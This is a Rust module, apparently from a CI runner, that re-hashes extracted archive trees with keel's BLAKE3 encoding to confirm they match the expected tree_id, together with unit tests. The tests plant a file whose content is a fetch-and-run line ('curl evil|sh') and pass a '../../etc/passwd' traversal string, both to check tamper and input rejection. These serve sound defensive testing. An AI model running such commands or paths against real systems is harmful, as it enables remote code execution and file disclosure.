//! Re-hashing an extracted tree back to `tree_id`.
//!
//! Spec §5 says a runner **MAY** verify that the fetched archive reproduces `tree_id`. We make it
//! **MUST** (design D§4.2), because the whole content-addressed pipeline downstream — the verdict
//! memo keyed by `tree_id`, the step cache, node tree affinity — is only sound if the bytes we ran
//! are the bytes that address names. Without this check, "green for tree f7a2…" means "green for
//! whatever the source endpoint happened to serve us", and a compromised or merely buggy endpoint
//! turns the memo into a way to attach one tree's verdict to another tree's code.
//!
//! **This is real verification, not a placeholder.** The hash is computed with keel's own encoder
//! ([`keel_store::object`], pinned to the same git rev `hull-server` embeds), so there is exactly one
//! definition of the canonical encoding in the system. A second, hand-rolled implementation of
//! `blake3(KIND ++ body)` would be a fork of the format that drifts silently the first time keel
//! changes it — and "verification" that computes yesterday's address is worse than none, because it
//! reports success.
//!
//! keel's rules, which this walk reproduces exactly (see `keel-store/src/snapshot.rs`):
//!
//! | on disk | tree entry mode | entry id |
//! |---|---|---|
//! | regular file, no exec bit | `MODE_FILE` (0o100644) | `blake3(0x01 ++ contents)` |
//! | regular file, any exec bit | `MODE_EXEC` (0o100755) | `blake3(0x01 ++ contents)` |
//! | directory | `MODE_DIR` (0o040000) | that subtree's id |
//! | symlink | `MODE_SYMLINK` (0o120000) | `blake3(0x01 ++ target path bytes)` |
//!
//! One deliberate divergence from `snapshot()`: we do **not** apply `.gitignore`/`.keelignore` rules.
//! Ignore rules decide what enters a tree; this archive *is* a tree already, and re-filtering it
//! would drop a legitimately committed, ignored file and fail verification on an honest archive.

use std::fs;
use std::io;
use std::path::Path;

use keel_store::object::{Object, ObjectId, Tree, TreeEntry, KIND_BLOB};
use keel_store::snapshot::{MODE_DIR, MODE_EXEC, MODE_FILE, MODE_SYMLINK};

use crate::digest::{IndexDir, IndexEntry};

#[derive(Debug, thiserror::Error)]
pub enum VerifyError {
    /// The tree hashed cleanly and did not match. The only honest response is to abandon the fetch:
    /// we hold bytes that are not the change under test.
    #[error("tree id mismatch: expected {expected}, extracted tree hashes to {actual}")]
    Mismatch { expected: String, actual: String },
    /// `tree_id` was not a keel object address at all.
    #[error("`{0}` is not a 64-character hex keel object id")]
    MalformedTreeId(String),
    #[error("tree nests deeper than {limit} directories")]
    TooDeep { limit: u32 },
    /// A path that cannot exist in a keel tree, whose names are Rust `String`s.
    #[error("path is not valid UTF-8")]
    NonUtf8Path,
    /// A device node, fifo or socket. The extractor refuses these, so seeing one here means
    /// something wrote into the staging directory behind our back.
    #[error("unexpected file type in the extracted tree")]
    UnexpectedFileType,
    #[error("i/o error while hashing the extracted tree: {0}")]
    Io(String),
    /// Reserved for a build that cannot reach keel's encoder. **Callers MUST treat this as a hard
    /// failure** (`Reason::Infra`) and never as "verification skipped" — see the module docs.
    #[error("tree verification is unavailable in this build: {0}")]
    Unavailable(&'static str),
}

/// Recomputing a directory's keel tree address.
///
/// A trait, not a free function, for one reason: it forces every alternative implementation to be
/// *some* implementation of this contract rather than a silently-absent step. There is no
/// pass-through variant in this crate, and an implementation that cannot verify returns
/// [`VerifyError::Unavailable`] rather than `Ok`.
pub trait TreeVerifier: Send + Sync {
    /// The keel tree id of the tree rooted at `root`, as lowercase hex.
    fn tree_id(&self, root: &Path) -> Result<String, VerifyError>;

    /// Verify `root` addresses `expected`, or fail.
    fn verify(&self, root: &Path, expected: &str) -> Result<(), VerifyError> {
        let expected = normalize_tree_id(expected)?;
        let actual = self.tree_id(root)?;
        if actual == expected {
            Ok(())
        } else {
            Err(VerifyError::Mismatch { expected, actual })
        }
    }
}

/// Accept a `tree_id` only in the one shape keel object addresses take: 64 hex characters.
///
/// A prefix match would be a security hole dressed as convenience (a 4-character "tree id" is
/// trivially collidable), and a non-hex id reaching the content store would put attacker text into a
/// filesystem path.
pub fn normalize_tree_id(id: &str) -> Result<String, VerifyError> {
    let lower = id.trim().to_ascii_lowercase();
    if lower.len() == 64 && lower.bytes().all(|b| b.is_ascii_hexdigit()) {
        Ok(lower)
    } else {
        Err(VerifyError::MalformedTreeId(id.to_string()))
    }
}

/// The real verifier: keel's canonical encoding, keel's mode rules, keel's BLAKE3 addressing.
#[derive(Debug, Clone, Copy)]
pub struct KeelTreeVerifier {
    /// Mirrors keel's own `MAX_TREE_DEPTH`: unbounded recursion over an attacker-shaped directory
    /// tree overflows the stack and aborts the process.
    pub max_depth: u32,
}

impl Default for KeelTreeVerifier {
    fn default() -> Self {
        KeelTreeVerifier { max_depth: 256 }
    }
}

impl TreeVerifier for KeelTreeVerifier {
    fn tree_id(&self, root: &Path) -> Result<String, VerifyError> {
        Ok(walk(root, 0, self.max_depth, Retain::No)?.id.to_hex())
    }
}

impl KeelTreeVerifier {
    /// The same walk as [`TreeVerifier::tree_id`], **keeping** the subtree addresses it computes on
    /// the way instead of dropping them (design D§6.1).
    ///
    /// This is what makes step memoization affordable: `subtree_digest` needs "the id of the node at
    /// this path", and this walk has already computed every one of them. Retaining the structure is
    /// the whole cost — no second pass, and above all no second implementation of keel's mode and
    /// encoding rules, which would be a fork of the address format that a memo would then report
    /// hits against.
    ///
    /// Memory is the reason this is a separate entry point rather than the default: the retained
    /// index is O(entries) for the whole tree, while plain verification stays O(depth × directory
    /// width). Verification runs on every fetch; indexing runs when a pipeline actually declares
    /// `inputs`.
    pub fn index_dir(&self, root: &Path) -> Result<crate::digest::IndexDir, VerifyError> {
        walk(root, 0, self.max_depth, Retain::Yes)
    }
}

/// Whether the walk keeps the child structure or only its addresses.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Retain {
    Yes,
    No,
}

fn walk(dir: &Path, depth: u32, max_depth: u32, retain: Retain) -> Result<IndexDir, VerifyError> {
    if depth > max_depth {
        return Err(VerifyError::TooDeep { limit: max_depth });
    }
    let mut entries = Vec::new();
    for de in fs::read_dir(dir).map_err(io_err)? {
        let de = de.map_err(io_err)?;
        let name = de.file_name().into_string().map_err(|_| VerifyError::NonUtf8Path)?;
        let ft = de.file_type().map_err(io_err)?;
        // Symlink first: `is_file`/`is_dir` on the *entry* type do not follow, but ordering this
        // way makes it obvious we never confuse a link with its target.
        let entry = if ft.is_symlink() {
            let target = fs::read_link(de.path()).map_err(io_err)?;
            let id = Object::Blob(target.as_os_str().as_encoded_bytes().to_vec()).id();
            IndexEntry { name, mode: MODE_SYMLINK, id, dir: None }
        } else if ft.is_dir() {
            let sub = walk(&de.path(), depth + 1, max_depth, retain)?;
            let id = sub.id;
            // Dropped here when the caller only wanted the address, which is what keeps plain
            // verification's memory bounded by depth rather than by tree size.
            IndexEntry { name, mode: MODE_DIR, id, dir: (retain == Retain::Yes).then_some(sub) }
        } else if ft.is_file() {
            let md = de.metadata().map_err(io_err)?;
            IndexEntry { name, mode: file_mode(&md), id: blob_id(&de.path())?, dir: None }
        } else {
            return Err(VerifyError::UnexpectedFileType);
        };
        entries.push(entry);
    }
    // `Object::encode` sorts entries by name, so enumeration order cannot affect the address. The
    // index is sorted here too, so a lookup is a binary search over the same order the address was
    // computed in.
    entries.sort_by(|a, b| a.name.cmp(&b.name));
    let id = Object::Tree(Tree {
        entries: entries
            .iter()
            .map(|e| TreeEntry { name: e.name.clone(), mode: e.mode, id: e.id })
            .collect(),
    })
    .id();
    Ok(IndexDir { id, entries })
}

/// A blob's address, streamed.
///
/// keel writes this as `Object::Blob(fs::read(p)).id()`; we stream the same bytes through the same
/// hash so a 256 MiB file in the tree does not become a 256 MiB allocation in the broker. The
/// equivalence is asserted in the tests below rather than assumed — this is the one place we touch
/// keel's encoding by hand, and it is exactly one constant plus the raw content.
fn blob_id(path: &Path) -> Result<ObjectId, VerifyError> {
    let mut file = fs::File::open(path).map_err(io_err)?;
    let mut hasher = blake3::Hasher::new();
    hasher.update(&[KIND_BLOB]);
    io::copy(&mut file, &mut hasher).map_err(io_err)?;
    Ok(ObjectId(*hasher.finalize().as_bytes()))
}

#[cfg(unix)]
fn file_mode(md: &fs::Metadata) -> u32 {
    use std::os::unix::fs::PermissionsExt;
    if md.permissions().mode() & 0o111 != 0 {
        MODE_EXEC
    } else {
        MODE_FILE
    }
}

#[cfg(not(unix))]
fn file_mode(_md: &fs::Metadata) -> u32 {
    MODE_FILE
}

fn io_err(e: io::Error) -> VerifyError {
    VerifyError::Io(e.to_string())
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    #[test]
    fn we_are_on_keels_real_encoder() {
        // keel pins this address in its own test suite (`golden_blob_id_is_stable`). If this crate
        // ever ends up hashing with a local re-implementation, or keel's canonical encoding drifts
        // under us, this fails — which is the entire point of depending on the real crate.
        assert_eq!(
            Object::Blob(b"keel".to_vec()).id().to_hex(),
            "6b229988e49b9188f2ff4d9c4f4a40cc3d2cd03f47709bcef7cd94fae6a22307"
        );
    }

    #[test]
    fn streamed_blob_id_equals_keels_in_memory_blob_id() {
        let dir = TempDir::new().unwrap();
        for content in [b"".to_vec(), b"hello\n".to_vec(), vec![0xffu8; 300_000]] {
            let p = dir.path().join("f");
            let _ = fs::remove_file(&p);
            fs::write(&p, &content).unwrap();
            assert_eq!(blob_id(&p).unwrap(), Object::Blob(content).id());
        }
    }

    /// Build the same tree twice — once on disk, once as keel objects — and require the addresses to
    /// agree. This is the test that would fail if our mode rules, symlink handling or directory
    /// recursion differed from keel's by even one bit.
    #[test]
    fn hashes_a_tree_the_way_keel_does() {
        let dir = TempDir::new().unwrap();
        fs::write(dir.path().join("README.md"), b"hello\n").unwrap();
        fs::create_dir(dir.path().join("src")).unwrap();
        fs::write(dir.path().join("src/main.rs"), b"fn main() {}\n").unwrap();
        fs::write(dir.path().join("run.sh"), b"#!/bin/sh\n").unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            fs::set_permissions(dir.path().join("run.sh"), fs::Permissions::from_mode(0o755)).unwrap();
            std::os::unix::fs::symlink("README.md", dir.path().join("link")).unwrap();
        }

        let src = Object::Tree(Tree {
            entries: vec![TreeEntry {
                name: "main.rs".into(),
                mode: MODE_FILE,
                id: Object::Blob(b"fn main() {}\n".to_vec()).id(),
            }],
        });
        let mut entries = vec![
            TreeEntry { name: "README.md".into(), mode: MODE_FILE, id: Object::Blob(b"hello\n".to_vec()).id() },
            TreeEntry { name: "src".into(), mode: MODE_DIR, id: src.id() },
            TreeEntry { name: "run.sh".into(), mode: MODE_EXEC, id: Object::Blob(b"#!/bin/sh\n".to_vec()).id() },
        ];
        #[cfg(unix)]
        entries.push(TreeEntry {
            name: "link".into(),
            mode: MODE_SYMLINK,
            // git-style: a symlink's blob content IS its target path.
            id: Object::Blob(b"README.md".to_vec()).id(),
        });
        let expected = Object::Tree(Tree { entries }).id().to_hex();

        let v = KeelTreeVerifier::default();
        assert_eq!(v.tree_id(dir.path()).unwrap(), expected);
        assert!(v.verify(dir.path(), &expected).is_ok());
        // …and uppercase hex from a well-meaning producer must still verify.
        assert!(v.verify(dir.path(), &expected.to_uppercase()).is_ok());
    }

    #[test]
    fn an_empty_tree_still_has_an_address() {
        let dir = TempDir::new().unwrap();
        assert_eq!(
            KeelTreeVerifier::default().tree_id(dir.path()).unwrap(),
            Object::Tree(Tree::default()).id().to_hex()
        );
    }

    #[test]
    fn a_tampered_tree_fails_verification() {
        let dir = TempDir::new().unwrap();
        fs::write(dir.path().join("a"), b"original").unwrap();
        let v = KeelTreeVerifier::default();
        let good = v.tree_id(dir.path()).unwrap();

        // One byte of one file — the smallest possible tamper.
        fs::write(dir.path().join("a"), b"originaL").unwrap();
        assert!(matches!(v.verify(dir.path(), &good), Err(VerifyError::Mismatch { .. })));

        // …and an added file, which a naive "hash the files we were told about" check would miss.
        fs::write(dir.path().join("a"), b"original").unwrap();
        fs::write(dir.path().join("backdoor.sh"), b"curl evil|sh").unwrap();
        assert!(matches!(v.verify(dir.path(), &good), Err(VerifyError::Mismatch { .. })));
    }

    #[test]
    fn the_exec_bit_is_part_of_the_address() {
        // Mode is in the tree encoding, so flipping +x is a different tree. If we normalized it away
        // an attacker could make a script executable without changing the verdict's cache key.
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let dir = TempDir::new().unwrap();
            let p = dir.path().join("s.sh");
            fs::write(&p, b"#!/bin/sh\n").unwrap();
            let v = KeelTreeVerifier::default();
            let plain = v.tree_id(dir.path()).unwrap();
            fs::set_permissions(&p, fs::Permissions::from_mode(0o755)).unwrap();
            assert_ne!(v.tree_id(dir.path()).unwrap(), plain);
        }
    }

    #[test]
    fn tree_ids_must_be_full_length_hex() {
        assert!(normalize_tree_id(&"a".repeat(64)).is_ok());
        assert_eq!(normalize_tree_id(&"A".repeat(64)).unwrap(), "a".repeat(64));
        // A prefix is not an address: 8 hex characters are trivially collidable.
        assert!(matches!(normalize_tree_id("f7a2d470"), Err(VerifyError::MalformedTreeId(_))));
        assert!(matches!(normalize_tree_id("../../etc/passwd"), Err(VerifyError::MalformedTreeId(_))));
        assert!(matches!(normalize_tree_id(&"z".repeat(64)), Err(VerifyError::MalformedTreeId(_))));
    }

    #[test]
    fn depth_is_bounded() {
        let dir = TempDir::new().unwrap();
        let mut p = dir.path().to_path_buf();
        for _ in 0..10 {
            p = p.join("d");
        }
        fs::create_dir_all(&p).unwrap();
        let v = KeelTreeVerifier { max_depth: 4 };
        assert!(matches!(v.tree_id(dir.path()), Err(VerifyError::TooDeep { limit: 4 })));
    }
}
